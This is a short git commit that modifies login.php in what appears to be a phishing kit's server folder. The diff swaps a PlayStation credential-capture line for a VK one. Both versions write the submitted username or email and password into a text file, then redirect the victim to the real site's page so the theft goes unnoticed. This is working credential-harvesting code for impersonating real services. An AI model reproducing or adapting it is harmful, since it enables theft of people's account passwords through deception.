03a38947114d4a50b478474d747248d55c60ef7a
yash <yashvyavahare02@gmail.com>
2023-06-12 00:37:36 +0530

    Modification is done of vk

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Playstation Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
+file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://vk.com/restore/');
 exit();
 ?>
